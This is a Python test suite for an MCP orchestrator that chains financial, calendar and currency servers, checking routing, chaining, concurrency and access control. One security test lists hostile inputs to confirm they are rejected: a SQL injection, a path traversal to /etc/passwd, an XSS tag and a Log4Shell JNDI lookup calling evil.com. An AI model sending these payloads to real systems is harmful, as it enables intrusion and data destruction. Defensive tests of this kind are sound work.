"""
Test MCP chaining integrity and orchestration

Tests the Model Context Protocol (MCP) chaining to ensure proper
communication between MCP servers and orchestration.
"""

import pytest
import json
import asyncio
from unittest.mock import Mock, patch, AsyncMock
from django.test import TestCase
from django.contrib.auth.models import User

from mcp_servers.mcp_orchestrator import MCPOrchestrator
from mcp_servers.financial_db_adapter.financial_db_adapter import FinancialDBAdapter
from mcp_servers.google_calendar_server.calendar_server import GoogleCalendarServer
from mcp_servers.currency_service.currency_service import CurrencyService


class TestMCPOrchestrator(TestCase):
    """Test MCP Orchestrator functionality"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.user = User.objects.create_user(
            username='testmerchant',
            email='test@example.com',
            password='testpass123'
        )
        
        self.orchestrator = MCPOrchestrator()
    
    def test_orchestrator_initialization(self):
        """Test orchestrator initializes with correct servers"""
        self.assertIn('financial_db_adapter', self.orchestrator.servers)
        self.assertIn('google_calendar_server', self.orchestrator.servers)
        self.assertIn('currency_service', self.orchestrator.servers)
        
        # Check server types
        self.assertIsInstance(
            self.orchestrator.servers['financial_db_adapter'], 
            FinancialDBAdapter
        )
        self.assertIsInstance(
            self.orchestrator.servers['google_calendar_server'], 
            GoogleCalendarServer
        )
        self.assertIsInstance(
            self.orchestrator.servers['currency_service'], 
            CurrencyService
        )
    
    def test_get_all_function_schemas(self):
        """Test aggregation of function schemas from all servers"""
        schemas = self.orchestrator.get_all_function_schemas()
        
        self.assertIsInstance(schemas, dict)
        
        # Check that schemas are prefixed with server names
        for method_name, schema in schemas.items():
            self.assertIn('.', method_name)  # Should have server.method format
            self.assertIn('name', schema)
            self.assertIn('description', schema)
            self.assertIn('parameters', schema)
    
    def test_execute_function_call_valid_method(self):
        """Test executing valid function calls"""
        # Mock successful response from server
        mock_response = {
            'jsonrpc': '2.0',
            'result': {
                'total_income': '5000.00',
                'total_expenses': '3000.00',
                'net_profit': '2000.00'
            },
            'id': 'test-123'
        }
        
        # Mock the server's handle_request method
        with patch.object(
            self.orchestrator.servers['financial_db_adapter'], 
            'handle_request', 
            return_value=mock_response
        ) as mock_handle:
            
            result = self.orchestrator.execute_function_call(
                'financial_db_adapter.generate_summary',
                {'merchant_id': self.user.id, 'timeframe': 'month'},
                request_id='test-123'
            )
            
            self.assertEqual(result, mock_response)
            mock_handle.assert_called_once()
    
    def test_execute_function_call_invalid_server(self):
        """Test executing function call with invalid server name"""
        result = self.orchestrator.execute_function_call(
            'invalid_server.generate_summary',
            {'merchant_id': self.user.id},
            request_id='test-123'
        )
        
        self.assertIn('error', result)
        self.assertEqual(result['error']['code'], -32601)
        self.assertIn('not found', result['error']['message'])
    
    def test_execute_function_call_invalid_method_format(self):
        """Test executing function call with invalid method name format"""
        result = self.orchestrator.execute_function_call(
            'invalid_method_name',
            {'merchant_id': self.user.id},
            request_id='test-123'
        )
        
        self.assertIn('error', result)
        self.assertEqual(result['error']['code'], -32600)
        self.assertIn('Invalid server_method_name format', result['error']['message'])


class TestMCPChainingIntegrity(TestCase):
    """Test MCP chaining integrity across multiple servers"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.user = User.objects.create_user(
            username='testmerchant',
            email='test@example.com',
            password='testpass123'
        )
        
        self.orchestrator = MCPOrchestrator()
    
    def test_financial_to_currency_chaining(self):
        """Test chaining financial analysis with currency conversion"""
        # Mock financial summary response
        financial_response = {
            'jsonrpc': '2.0',
            'result': {
                'total_income': '5000.00',
                'total_expenses': '3000.00',
                'net_profit': '2000.00',
                'currency': 'USD'
            },
            'id': 'financial-123'
        }
        
        # Mock currency conversion response
        currency_response = {
            'jsonrpc': '2.0',
            'result': {
                'converted_amount': '1800.00',
                'exchange_rate': '0.90',
                'target_currency': 'EUR'
            },
            'id': 'currency-123'
        }
        
        with patch.object(
            self.orchestrator.servers['financial_db_adapter'], 
            'handle_request', 
            return_value=financial_response
        ), patch.object(
            self.orchestrator.servers['currency_service'], 
            'handle_request', 
            return_value=currency_response
        ):
            
            # First call: Get financial summary
            financial_result = self.orchestrator.execute_function_call(
                'financial_db_adapter.generate_summary',
                {'merchant_id': self.user.id, 'timeframe': 'month'}
            )
            
            # Second call: Convert profit to EUR
            currency_result = self.orchestrator.execute_function_call(
                'currency_service.convert_currency',
                {
                    'amount': '2000.00',
                    'base': 'USD',
                    'target': 'EUR'
                }
            )
            
            # Verify both calls succeeded
            self.assertIn('result', financial_result)
            self.assertIn('result', currency_result)
            
            # Verify chaining logic
            profit_usd = financial_result['result']['net_profit']
            profit_eur = currency_result['result']['converted_amount']
            
            self.assertEqual(profit_usd, '2000.00')
            self.assertEqual(profit_eur, '1800.00')
    
    def test_calendar_to_financial_chaining(self):
        """Test chaining calendar events with financial analysis"""
        # Mock calendar event response
        calendar_response = {
            'jsonrpc': '2.0',
            'result': {
                'id': 'event_123',
                'message': 'Event created successfully',
                'local_event_id': 'local_123'
            },
            'id': 'calendar-123'
        }
        
        # Mock financial summary response
        financial_response = {
            'jsonrpc': '2.0',
            'result': {
                'total_income': '5000.00',
                'total_expenses': '3000.00',
                'net_profit': '2000.00'
            },
            'id': 'financial-123'
        }
        
        with patch.object(
            self.orchestrator.servers['google_calendar_server'], 
            'handle_request', 
            return_value=calendar_response
        ), patch.object(
            self.orchestrator.servers['financial_db_adapter'], 
            'handle_request', 
            return_value=financial_response
        ):
            
            # First call: Create calendar event
            calendar_result = self.orchestrator.execute_function_call(
                'google_calendar_server.calendar_create_event',
                {
                    'merchant_id': self.user.id,
                    'title': 'Financial Review Meeting',
                    'event_date': '2024-01-16T10:00:00Z',
                    'description': 'Monthly financial review'
                }
            )
            
            # Second call: Get financial summary for the meeting
            financial_result = self.orchestrator.execute_function_call(
                'financial_db_adapter.generate_summary',
                {'merchant_id': self.user.id, 'timeframe': 'month'}
            )
            
            # Verify both calls succeeded
            self.assertIn('result', calendar_result)
            self.assertIn('result', financial_result)
            
            # Verify event was created
            self.assertEqual(calendar_result['result']['id'], 'event_123')
            
            # Verify financial data is available
            self.assertEqual(financial_result['result']['net_profit'], '2000.00')
    
    def test_error_propagation_in_chaining(self):
        """Test error propagation in MCP chaining"""
        # Mock error response from financial server
        error_response = {
            'jsonrpc': '2.0',
            'error': {
                'code': -32602,
                'message': 'Invalid merchant_id'
            },
            'id': 'financial-123'
        }
        
        with patch.object(
            self.orchestrator.servers['financial_db_adapter'], 
            'handle_request', 
            return_value=error_response
        ):
            
            # Call should fail
            result = self.orchestrator.execute_function_call(
                'financial_db_adapter.generate_summary',
                {'merchant_id': 999999, 'timeframe': 'month'}  # Invalid merchant ID
            )
            
            # Verify error is propagated
            self.assertIn('error', result)
            self.assertEqual(result['error']['code'], -32602)
    
    def test_concurrent_function_calls(self):
        """Test handling of concurrent function calls"""
        import threading
        import time
        
        # Mock responses
        mock_responses = [
            {
                'jsonrpc': '2.0',
                'result': {'total_income': '5000.00'},
                'id': f'call-{i}'
            }
            for i in range(5)
        ]
        
        response_iter = iter(mock_responses)
        
        def mock_handle_request(request):
            time.sleep(0.1)  # Simulate processing time
            return next(response_iter)
        
        with patch.object(
            self.orchestrator.servers['financial_db_adapter'], 
            'handle_request', 
            side_effect=mock_handle_request
        ):
            
            results = []
            threads = []
            
            def make_call():
                result = self.orchestrator.execute_function_call(
                    'financial_db_adapter.generate_summary',
                    {'merchant_id': self.user.id, 'timeframe': 'month'}
                )
                results.append(result)
            
            # Create multiple threads
            for i in range(5):
                thread = threading.Thread(target=make_call)
                threads.append(thread)
                thread.start()
            
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
            
            # Verify all calls completed
            self.assertEqual(len(results), 5)
            for result in results:
                self.assertIn('result', result)


class TestMCPPerformance(TestCase):
    """Test MCP performance and scalability"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.orchestrator = MCPOrchestrator()
    
    def test_large_schema_aggregation_performance(self):
        """Test performance of large schema aggregation"""
        import time
        
        # Mock large schema responses from servers
        large_schema = {}
        for i in range(50):
            large_schema[f'financial_db_adapter.method_{i}'] = {
                'name': f'financial_db_adapter.method_{i}',
                'description': f'Description for method {i}',
                'parameters': {
                    'type': 'object',
                    'properties': {
                        'param1': {'type': 'string'},
                        'param2': {'type': 'integer'}
                    }
                }
            }
        
        with patch.object(
            self.orchestrator.servers['financial_db_adapter'],
            'get_function_schemas',
            return_value={f'method_{i}': large_schema[f'financial_db_adapter.method_{i}'] for i in range(50)}
        ):
            start_time = time.time()
            schemas = self.orchestrator.get_all_function_schemas()
            end_time = time.time()
            
            # Should complete within reasonable time
            self.assertLess(end_time - start_time, 2.0)
            self.assertGreater(len(schemas), 50)
    
    def test_function_call_latency(self):
        """Test function call latency"""
        import time
        
        # Mock fast response
        mock_response = {
            'jsonrpc': '2.0',
            'result': {'success': True},
            'id': 'test'
        }
        
        with patch.object(
            self.orchestrator.servers['financial_db_adapter'], 
            'handle_request', 
            return_value=mock_response
        ):
            start_time = time.time()
            result = self.orchestrator.execute_function_call(
                'financial_db_adapter.generate_summary',
                {'merchant_id': 1, 'timeframe': 'month'}
            )
            end_time = time.time()
            
            # Should complete quickly (less than 100ms for mock)
            self.assertLess(end_time - start_time, 0.1)
            self.assertIn('result', result)


class TestMCPSecurity(TestCase):
    """Test MCP security and access control"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.orchestrator = MCPOrchestrator()
        self.user = User.objects.create_user(
            username='testmerchant',
            email='test@example.com',
            password='testpass123'
        )
    
    def test_merchant_isolation(self):
        """Test that merchants can only access their own data"""
        other_user = User.objects.create_user(
            username='othermerchant',
            email='other@example.com',
            password='otherpass123'
        )
        
        # Mock response that should only contain current user's data
        mock_response = {
            'jsonrpc': '2.0',
            'result': {
                'merchant_id': self.user.id,
                'total_income': '5000.00'
            },
            'id': 'test'
        }
        
        with patch.object(
            self.orchestrator.servers['financial_db_adapter'], 
            'handle_request', 
            return_value=mock_response
        ) as mock_handle:
            
            result = self.orchestrator.execute_function_call(
                'financial_db_adapter.generate_summary',
                {'merchant_id': self.user.id, 'timeframe': 'month'}
            )
            
            # Verify the merchant_id in the call matches the user
            call_args = mock_handle.call_args[0][0]
            self.assertEqual(call_args['params']['merchant_id'], self.user.id)
            
            # Verify response contains correct merchant data
            self.assertEqual(result['result']['merchant_id'], self.user.id)
    
    def test_malicious_function_calls(self):
        """Test handling of potentially malicious function calls"""
        malicious_calls = [
            'financial_db_adapter.generate_summary; DROP TABLE transactions;',
            '../../etc/passwd',
            '<script>alert("xss")</script>',
            '${jndi:ldap://evil.com/exploit}'
        ]
        
        for malicious_call in malicious_calls:
            result = self.orchestrator.execute_function_call(
                malicious_call,
                {'merchant_id': self.user.id}
            )
            
            # Should return error for malicious calls
            self.assertIn('error', result)
    
    def test_parameter_validation(self):
        """Test parameter validation in function calls"""
        # Test with invalid parameter types
        invalid_params = [
            {'merchant_id': 'not_a_number', 'timeframe': 'month'},
            {'merchant_id': -1, 'timeframe': 'month'},
            {'merchant_id': self.user.id, 'timeframe': 'invalid_timeframe'},
            {'merchant_id': self.user.id},  # Missing required parameter
        ]
        
        for params in invalid_params:
            # Mock error response for invalid parameters
            error_response = {
                'jsonrpc': '2.0',
                'error': {
                    'code': -32602,
                    'message': 'Invalid params'
                },
                'id': 'test'
            }
            
            with patch.object(
                self.orchestrator.servers['financial_db_adapter'], 
                'handle_request', 
                return_value=error_response
            ):
                result = self.orchestrator.execute_function_call(
                    'financial_db_adapter.generate_summary',
                    params
                )
                
                # Should return error for invalid parameters
                self.assertIn('error', result)
                self.assertEqual(result['error']['code'], -32602)


if __name__ == '__main__':
    pytest.main([__file__])


